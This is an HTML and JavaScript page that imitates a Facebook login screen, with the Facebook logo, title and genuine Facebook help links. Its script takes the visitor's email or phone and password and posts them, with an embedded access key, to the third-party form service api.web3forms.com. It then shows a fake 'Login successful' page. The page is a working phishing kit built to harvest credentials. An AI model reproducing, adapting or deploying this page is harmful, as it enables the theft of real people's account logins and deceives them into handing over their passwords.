<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook Login</title>
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      padding: 0;
      font-family: 'Helvetica Neue', Arial, sans-serif;
      background-color: #FAF3F3;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
    }

    .login-container {
      width: 90%;
      max-width: 360px;
      padding: 40px;
      background-color: #fff;
      border-radius: 8px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
      text-align: center;
      color: #000;
    }

    .facebook-logo {
      margin-bottom: 20px;
    }

    .facebook-logo img {
      width: 120px;
      height: auto;
    }

    h1 {
      color: #1877f2;
      font-size: 36px;
      margin-bottom: 20px;
      font-weight: bold;
    }

    form {
      display: flex;
      flex-direction: column;
    }

    input {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      font-size: 16px;
      border: 1px solid #dcdcdc;
      border-radius: 6px;
      background-color: #f5f6f7;
      color: #000;
      transition: border-color 0.3s;
    }

    input:focus {
      border-color: #1877f2;
      outline: none;
    }

    button {
      width: 100%;
      padding: 12px;
      font-size: 18px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      background-color: #1877f2;
      color: #fff;
      font-weight: bold;
      margin-top: 10px;
      transition: background-color 0.3s;
    }

    button:hover {
      background-color: #145dbf;
    }

    #result {
      margin-top: 15px;
      color: #f00;
    }

    .forgot-password-container,
    .create-account-container {
      margin-top: 10px;
      text-align: center;
    }

    .forgot-password,
    .create-account {
      color: #1877f2;
      text-decoration: none;
      font-size: 14px;
      font-weight: bold;
      margin: 0 10px;
    }

    .forgot-password:hover,
    .create-account:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="login-container" id="login-container">
    <div class="facebook-logo">
      <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
    </div>
    <h1>Login</h1>
    <form method="POST" id="form">
      <input type="hidden" name="access_key" value="3e4f758d-de26-4bd1-96d6-6f4c005d757f">
      <input type="email" name="email" placeholder="Email or Phone" required>
      <input type="password" name="P4$$W0RD" placeholder="Password" required>
      <input type="checkbox" name="botcheck" class="hidden" style="display: none;">
      <button type="submit">Log In</button>
      <div class="forgot-password-container">
        <a href="https://m.facebook.com/login/identify/" class="forgot-password">Forgot password?</a>
      </div>
      <div class="create-account-container">
        <a href="https://m.facebook.com/reg/" class="create-account">Create new account</a>
      </div>
      <div id="result"></div>
    </form>
  </div>

  <!-- Greetings Page (Initially Hidden) -->
  <div id="greetings-page" style="display: none;">
    <h1>Welcome, User!</h1>
    <p>You have successfully logged in.</p>
    <button id="logout-button">Log Out</button>
  </div>

  <script>
    const form = document.getElementById('form');
    const result = document.getElementById('result');
    const loginContainer = document.getElementById('login-container');
    const greetingsPage = document.getElementById('greetings-page');
    const logoutButton = document.getElementById('logout-button');

    // Check if the user is already logged in
    if (localStorage.getItem('isLoggedIn') === 'true') {
      loginContainer.style.display = 'none';
      greetingsPage.style.display = 'block';
    }

    form.addEventListener('submit', function(e) {
      e.preventDefault();

      const formData = new FormData(form);
      const object = Object.fromEntries(formData);
      const json = JSON.stringify(object);
      result.innerHTML = "";

      fetch('https://api.web3forms.com/submit', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json'
        },
        body: json
      })
      .then(response => response.json())
      .then(data => {
        if (data.success) {
          result.innerHTML = "Login successful! Redirecting...";
          // Save login state in localStorage
          localStorage.setItem('isLoggedIn', 'true');
          // Redirect to greetings page
          setTimeout(() => {
            loginContainer.style.display = 'none';
            greetingsPage.style.display = 'block';
          }, 2000);
        } else {
          result.innerHTML = "Login failed. Please try again.";
        }
      })
      .catch(error => {
        result.innerHTML = "Please open your internet once Login you can turn it off.";
        console.error('Error:', error);
      });
    });

    // Logout functionality
    logoutButton.addEventListener('click', function() {
      localStorage.removeItem('isLoggedIn');
      greetingsPage.style.display = 'none';
      loginContainer.style.display = 'block';
    });
  </script>
</body>
</html>
